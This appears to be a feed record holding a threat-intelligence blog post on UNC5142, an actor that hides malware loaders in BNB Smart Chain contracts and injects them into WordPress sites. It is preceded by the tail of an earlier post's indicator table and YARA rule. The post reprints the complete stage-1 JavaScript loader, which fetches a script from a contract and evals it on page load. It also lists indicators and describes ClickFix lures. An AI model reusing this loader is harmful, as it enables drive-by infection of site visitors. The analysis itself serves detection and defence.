(Attacker-Controlled)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">0x9bc1355344b54dedf3e44296916ed15653844509</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Owner address of the malicious BNB Smart Chain contract.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Ethereum Transaction Hash (INVISIBLEFERRET.JAVASCRIPT Payload)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">0x86d1a21fd151e344ccc0778fd018c281db9d40b6ccd4bdd3588cb40fade1a33a</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Transaction storing the INVISIBLEFERRET.JAVASCRIPT payload.</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Ethereum Transaction Hash (INVISIBLEFERRET.JAVASCRIPT Split Payload)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">0xc2da361c40279a4f2f84448791377652f2bf41f06d18f19941a96c720228cd0f</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Transaction storing the split INVISIBLEFERRET.JAVASCRIPT payload</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Ethereum Transaction Hash (INVISIBLEFERRET Credential Stealer Payload)</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><code style=\"vertical-align: baseline;\">0xf9d432745ea15dbc00ff319417af3763f72fcf8a4debedbfceeef4246847ce41</code></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Transaction storing the additional INVISIBLEFERRET.JAVASCRIPT credential stealer payload.</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h3>YARA Detections</h3></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>rule G_Downloader_JADESNOW_1 {\n\tmeta:\n\t\tauthor = \"Google Threat Intelligence Group (GTIG)\"\n\tstrings:\n\t\t$s1 = \"global['_V']\"\n\t\t$s2 = \"global['r']\"\n\t\t$s3 = \"umP\"\n\t\t$s4 = \"mergeConfig\"\n\t\t$s5 = \"charAt\" nocase\n\tcondition:\n\t\tuint16(0) != 0x5A4D and filesize &lt; 10KB and #s3 &gt; 2 and #s5 == 1 and all of them\n}</code></pre></div>"}
{"source": "Threat Intelligence", "title": "New Group on the Block: UNC5142 Leverages EtherHiding to Distribute Malware", "link": "https://cloud.google.com/blog/topics/threat-intelligence/unc5142-etherhiding-distribute-malware/", "published": "Thu, 16 Oct 2025 14:00:00 +0000", "summary": "<div class=\"block-paragraph_advanced\"><p>Written by: <span style=\"vertical-align: baseline;\">Mark Magee, Jose Hernandez, Bavi Sadayappan, Jessa Valdez</span></p>\n<hr /></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Since late 2023, </span><a href=\"https://cloud.google.com/security/products/managed-defense\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Mandiant Threat Defense</span></a><span style=\"vertical-align: baseline;\"> and Google Threat Intelligence Group (GTIG) have tracked UNC5142, a financially motivated threat actor that abuses the blockchain to facilitate the distribution of information stealers (infostealers).</span><span style=\"vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">UNC5142 is characterized by its use of compromised WordPress websites and \"EtherHiding<span style=\"vertical-align: baseline;\">\"</span>, a technique used to obscure malicious code or data by placing it on a public blockchain, such as the </span><a href=\"https://www.bnbchain.org/en\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">BNB Smart Chain</span></a><span style=\"vertical-align: baseline;\">. This post is part of a two-part blog series </span><span style=\"vertical-align: baseline;\">on adversaries using the EtherHiding technique. Read our other post on <a href=\"https://cloud.google.com/blog/topics/threat-intelligence/dprk-adopts-etherhiding\">North Korea (DPRK) adopting EtherHiding</a>.</span></p>\n<p><span style=\"vertical-align: baseline;\">Since late 2023, UNC5142 has significantly evolved their tactics, techniques, and procedures (TTPs) to enhance operational security and evade detection. Notably, we have not observed UNC5142 activity since late July 2025, suggesting a shift in the actor’s operational methods or a pause in their activity. </span></p>\n<p><span style=\"vertical-align: baseline;\">UNC5142 appears to indiscriminately target vulnerable WordPress sites, leading to widespread and opportunistic campaigns that impact a range of industry and geographic regions. As of June 2025, GTIG had identified approximately 14,000 web pages containing injected JavaScript consistent with an UNC5142 compromised website. We have seen UNC5142 campaigns distribute infostealers including </span><span style=\"vertical-align: baseline;\">ATOMIC</span><span style=\"vertical-align: baseline;\">, </span><span style=\"vertical-align: baseline;\">VIDAR</span><span style=\"vertical-align: baseline;\">, </span><span style=\"vertical-align: baseline;\">LUMMAC.V2</span><span style=\"vertical-align: baseline;\">, and </span><span style=\"vertical-align: baseline;\">RADTHIEF</span><span style=\"vertical-align: baseline;\">. GTIG does not currently attribute these final payloads to UNC5142 as it is possible these payloads are distributed on behalf of other threat actors. This post will detail the full UNC5142 infection chain, analyze its novel use of smart contracts for operational infrastructure, and chart the evolution of its TTPs based on direct observations from Mandiant Threat Defense incidents.</span></p>\n<h3><span style=\"vertical-align: baseline;\">UNC5142 Attack Overview</span></h3>\n<p><span style=\"vertical-align: baseline;\">An UNC5142 infection chain typically involves the following key components or techniques:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">CLEARSHORT</strong><span style=\"vertical-align: baseline;\">: A multistage JavaScript downloader to facilitate the distribution of payloads </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Compromised WordPress Websites:</strong><span style=\"vertical-align: baseline;\"> Websites running vulnerable versions of WordPress, or using vulnerable plugins/themes </span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Smart Contracts:</strong><span style=\"vertical-align: baseline;\"> Self-executing contracts stored on the BNB Smart Chain (BSC) blockchain</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">EtherHiding</strong><span style=\"vertical-align: baseline;\">: A technique used to obscure malicious code or data by placing it on a public blockchain. UNC5142 relies heavily on the BNB Smart Chain to store its malicious components in smart contracts, making them harder for traditional website security tools to detect and block</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"CLEARSHORT infection chain\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/unc5142-etherhiding-fig1a.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: CLEARSHORT infection chain</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">CLEARSHORT</span></h4>\n<p><span style=\"vertical-align: baseline;\">CLEARSHORT is a multistage JavaScript downloader used to facilitate malware distribution. The first stage consists of a JavaScript payload injected into vulnerable websites, designed to retrieve the second-stage payload from a malicious smart contract. The smart contract is responsible for fetching the next stage, a CLEARSHORT landing page, from an external attacker-controlled server. The CLEARSHORT landing page leverages ClickFix, a popular social engineering technique aimed at luring victims to locally run a malicious command using the Windows Run dialog box. </span></p>\n<p><span style=\"vertical-align: baseline;\">CLEARSHORT is an evolution of the CLEARFAKE downloader, which UNC5142 previously leveraged in their operations from late 2023 through mid-2024. CLEARFAKE is a malicious JavaScript framework that masquerades as a Google Chrome browser update notification. The primary function of the embedded JavaScript is to download a payload after the user clicks the \"Update Chrome\" button. The second-stage payload is a Base64-encoded JavaScript code stored </span><span style=\"vertical-align: baseline;\">in a smart contract deployed on the BNB Smart Chain</span><span style=\"vertical-align: baseline;\">.</span></p>\n<h4><span style=\"vertical-align: baseline;\">Compromised WordPress Sites</span></h4>\n<p><span style=\"vertical-align: baseline;\">The attack begins from the compromise of a vulnerable WordPress website which is exploited to gain unauthorized access. UNC5142 injects malicious JavaScript (CLEARSHORT stage 1) code into one of three locations:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Plugin directories:</strong><span style=\"vertical-align: baseline;\"> Modifying existing plugin files or adding new malicious files</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Theme files:</strong><span style=\"vertical-align: baseline;\"> Modifying theme files (like </span><code style=\"vertical-align: baseline;\">header.php</code><span style=\"vertical-align: baseline;\">, </span><code style=\"vertical-align: baseline;\">footer.php</code><span style=\"vertical-align: baseline;\">, or </span><code style=\"vertical-align: baseline;\">index.php</code><span style=\"vertical-align: baseline;\">) to include the malicious script</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Database:</strong><span style=\"vertical-align: baseline;\"> In some cases, the malicious code is injected directly into the WordPress database</span></p>\n</li>\n</ul>\n<h5><span style=\"vertical-align: baseline;\">What is a Smart Contract?</span></h5>\n<p><span style=\"vertical-align: baseline;\">Smart contracts are programs stored on a blockchain, like the BNB Smart Chain (BSC), that run automatically when a specified trigger occurs. While these triggers can be complex, CLEARSHORT uses a simpler method by calling a function that tells the contract to execute and return a pre-stored piece of data.</span></p>\n<p><span style=\"vertical-align: baseline;\">Smart contracts provide several advantages for threat actors to use in their operations, including:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Obfuscation:</strong><span style=\"vertical-align: baseline;\"> Storing malicious code within a smart contract makes it harder to detect with traditional web security tools that might scan website content directly.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Mutability (and Agility):</strong><span style=\"vertical-align: baseline;\"> While smart contracts themselves are immutable, the attackers use a clever technique. They deploy a first-level smart contract that contains a pointer to a second-level smart contract. The first-level contract acts as a stable entry point whose address never changes on the compromised website, directing the injected JavaScript to fetch code from a second-level contract, giving the attackers the ability to change this target without altering the compromised website.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Resilience</strong><span style=\"vertical-align: baseline;\">: The use of blockchain technology for large parts of UNC5142’s infrastructure and operation increases their resiliency in the face of detection and takedown efforts. Network based protection mechanisms are more difficult to implement for Web3 traffic compared to traditional web traffic given the lack of use of traditional URLs. Seizure and takedown operations are also hindered given the immutability of the blockchain. This is further discussed later in the post.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Leveraging legitimate infrastructure:</strong><span style=\"vertical-align: baseline;\"> The BNB Smart Chain is a legitimate platform. Using it can help the malicious traffic blend in with normal activity as a means to evade detection.</span></p>\n</li>\n</ul>\n<h5><span style=\"vertical-align: baseline;\">Smart Contract Interaction</span></h5>\n<p><span style=\"vertical-align: baseline;\">CLEARSHORT stage 1 uses </span><code style=\"vertical-align: baseline;\">Web3.js</code><span style=\"vertical-align: baseline;\">, a collection of libraries that allow interaction with remote ethereum nodes using HTTP, IPC or WebSocket. Typically to connect to the BNB Smart Chain via a public node like </span><code style=\"vertical-align: baseline;\">bsc-dataseed.binance[.]org</code><span style=\"vertical-align: baseline;\">. The stage 1 code contains instructions to interact with specific smart contract addresses, and calls functions defined in the contract’s Application Binary Interface (ABI). These functions return payloads, including URLs to the CLEARSHORT landing page. </span><span style=\"vertical-align: baseline;\">This page is decoded and executed within the browser, displaying a fake error message to the victim. The lure and template of this error message has varied over time, while maintaining the goal to lure the victim to run a malicious command via the Run dialog box. The executed command ultimately results in the download and execution of a follow-on payload, which is often an infostealer.</span></p></div>\n<div class=\"block-paragraph_advanced\"><pre class=\"language-plain\"><code>// Load libraries from public CDNs to intereact with blockchain and decode payloads.\n&lt;script src=\"https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js\"&gt;&lt;/script&gt;\n&lt;script src=\"https://cdnjs.cloudflare.com/ajax/libs/pako/2.0.4/pako.min.js\"&gt;&lt;/script&gt;\n&lt;script src=\"https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js\"&gt;&lt;/script&gt;\n&lt;script&gt;\n    console.log('Start moving...');\n    // The main malicious logic starts executing once the webpage's DOM is fully loaded.1st\n    document.addEventListener('DOMContentLoaded', async () =&gt; {\n        try {\n            // Establishes a connection to the BNB Smart Chain via a public RPC node. \n            const web3 = new Web3('https://bsc-dataseed.binance.org/');\n            // Creates an object to interact with the 1st-Level Smart Contract.\n            const contract = new web3.eth.Contract([\n                {\n                    \"inputs\": [],\n                    \"stateMutability\": \"nonpayable\",\n                    \"type\": \"constructor\"\n                },\n                {\n                    \"inputs\": [],\n                    \"name\": \"orchidABI\", // Returns 2nd contract ABI\n                    \"outputs\": [{\n                        \"internalType\": \"string\",\n                        \"name\": \"\",\n                        \"type\": \"string\"\n                    }],\n                    \"stateMutability\": \"view\",\n                    \"type\": \"function\"\n                },\n                {\n                    \"inputs\": [],\n                    \"name\": \"orchidAddress\",// Returns 2nd contract address\n                    \"outputs\": [{\n                        \"internalType\": \"string\",\n                        \"name\": \"\",\n                        \"type\": \"string\"\n                    }],\n                    \"stateMutability\": \"view\",\n                    \"type\": \"function\"\n                },\n            \n            ], '0x9179dda8B285040Bf381AABb8a1f4a1b8c37Ed53'); // Hardcoded address of the 1st-Level Contract.\n\t//  ABI is Base64 decoded and then decompressed to get clean ABI.\n            const orchidABI = JSON.parse(pako.ungzip(Uint8Array.from(atob(await contract.methods.orchidABI().call()), c =&gt; c.charCodeAt(0)), {\n                to: 'string'\n            }));\n            // Calls the 'orchidAddress' function to get the address of the 2nd-Level Contract.\n            const orchidAddress = await contract.methods.orchidAddress().call();\n\t     // New contract object created to represent 2nd-level contract.\n            const orchid = new web3.eth.Contract(orchidABI, orchidAddress);\n            const decompressedScript = pako.ungzip(Uint8Array.from(atob(await orchid.methods.tokyoSkytree().call()), c =&gt; c.charCodeAt(0)), {\n                to: 'string'\n            });\n            eval(`(async () =&gt; { ${decompressedScript} })().then(() =&gt; { console.log('Moved.'); }).catch(console.error);`);\n        } catch (error) {\n            console.error('Road unavaible:', error);\n        }\n    });\n&lt;/script&gt;</code></pre>\n<p style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Figure 2: Injected code from a compromised website - CLEARSHORT stage 1</span></p></div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">When a user visits a compromised web page, the injected JavaScript executes in the browser and initiates a set of connections to one or multiple BNB smart contracts, resulting in the retrieval and rendering of the CLEARSHORT landing page (stage 2) (Figure 3).</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"CLEARSHORT Landing Page showing Cloudflare “Unusual Web Traffic” error\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/unc5142-etherhiding-fig3.gif\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 3: CLEARSHORT Landing Page showing Cloudflare “Unusual Web Traffic” error</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">EtherHiding</span></h4>\n<p><span style=\"vertical-align: baseline;\">A key element of UNC5142's operations is their use of the EtherHiding technique. Instead of embedding their entire attack chain within the compromised website, they store malicious components on the BNB Smart Chain, using smart contracts as a dynamic configuration and control backend.</span><span style=\"vertical-align: baseline;\">The on-chain operation is managed by one or more actor-controlled wallets. These </span><a href=\"https://academy.binance.com/en/glossary/externally-owned-account-eoa\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Externally Owned Accounts (EOAs)</span></a><span style=\"vertical-align: baseline;\"> are used to:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Deploy the smart contracts, establishing the foundation of the attack chain.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Supply the BNB needed to pay network fees for making changes to the attack infrastructure.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><span style=\"vertical-align: baseline;\">Update pointers and data within the contracts, such as changing the address of a subsequent contract or rotating the payload decryption keys.</span></p>\n</li>\n</ul></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"UNC5142&#x27;s EtherHiding architecture on the BNB Smart Chain\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/unc5142-etherhiding-fig4a.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 4: UNC5142's EtherHiding architecture on the BNB Smart Chain</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Evolution of UNC5142 TTPs</span></h3>\n<p><span style=\"vertical-align: baseline;\">Over the past year, Mandiant Threat Defense and GTIG have observed a consistent evolution in UNC5142's TTPs. Their campaigns have progressed from a single-contract system to the significantly more complex three-level smart contract architecture that enables their dynamic, multi-stage approach beginning in late 2024.</span></p>\n<p><span style=\"vertical-align: baseline;\">This evolution is characterized by several key shifts: the adoption of a three smart contract system for dynamic payload delivery, the abuse of legitimate services like Cloudflare Pages for hosting malicious lures, and a transition from simple Base64 encoding to AES encryption. The actor has continuously refined its social engineering lures and expanded its infrastructure, at times operating parallel sets of smart contracts to increase both the scale and resilience of their campaigns.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /><col /></colgroup>\n<thead>\n<tr>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Timeframe</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Key Changes</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Hosting &amp; Infrastructure</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Lure Encoding / Encryption</strong></p>\n</th>\n<th scope=\"col\" style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Notable Lures &amp; Payloads</strong></p>\n</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><strong style=\"vertical-align: baseline;\">May 2024</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Single smart contract system</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><code style=\"vertical-align: baseline;\">.shop</code><span style=\"vertical-align: baseline;\"> TLDs for lures and C2</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Base64</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Fake Chrome update lures</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><strong style=\"vertical-align: baseline;\">November 2024</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Introduction of the three-smart-contract system</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Abuse of Cloudflare </span><code style=\"vertical-align: baseline;\">*.pages.dev</code><span style=\"vertical-align: baseline;\"> for lures</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">.shop / .icu domains for recon</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">AES-GCM + Base64</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">STUN server for victim IP recon</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><strong style=\"vertical-align: baseline;\">January 2025</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Refinement of the three-contract system</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Continued </span><code style=\"vertical-align: baseline;\">*.pages.dev</code><span style=\"vertical-align: baseline;\"> abuse</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">AES-GCM + Base64</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">New lures: Fake reCAPTCHA, Data Privacy agreements</span></p>\n<p style=\"text-align: left;\"><strong style=\"vertical-align: baseline;\">ATOMIC</strong><span style=\"vertical-align: baseline;\"> (macOS), </span><strong style=\"vertical-align: baseline;\">VIDAR</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><strong style=\"vertical-align: baseline;\">February 2025</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Secondary infrastructure deployed</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Payload URL stored in smart contract</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Expanded use of </span><code style=\"vertical-align: baseline;\">*.pages.dev</code><span style=\"vertical-align: baseline;\"> and new payload domains</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">AES-GCM + Base64</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">New Lure: Cloudflare \"Unusual Web Traffic\" error</span></p>\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Recon check-in removed, replaced by cookie tracking</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><strong style=\"vertical-align: baseline;\">March 2025</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Active use of both Main and Secondary infrastructure</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">MediaFire and GitHub for payload hosting</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">AES-GCM + Base64</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Staged POST check-ins to track victim interaction</span></p>\n<p style=\"text-align: left;\"><strong style=\"vertical-align: baseline;\">RADTHIEF</strong><span style=\"vertical-align: baseline;\">, </span><strong style=\"vertical-align: baseline;\">LUMMAC.V2</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><strong style=\"vertical-align: baseline;\">May 2025</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">Continued refinement of lures and payload delivery</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><code style=\"vertical-align: baseline;\">*.pages.dev</code><span style=\"vertical-align: baseline;\"> for lures, various TLDs for payloads</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">AES-GCM + Base64</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: left;\"><span style=\"vertical-align: baseline;\">New Lure: \"Anti-Bot Verification\" for Windows &amp; macOS</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Cloudflare Pages Abuse</span></h4>\n<p><span style=\"vertical-align: baseline;\">In late 2024, UNC5142 shifted to the use of the Cloudflare Pages service (</span><code style=\"vertical-align: baseline;\">*.pages.dev</code><span style=\"vertical-align: baseline;\">) to host their landing pages; previously they leveraged </span><code style=\"vertical-align: baseline;\">.shop</code><span style=\"vertical-align: baseline;\"> TLD 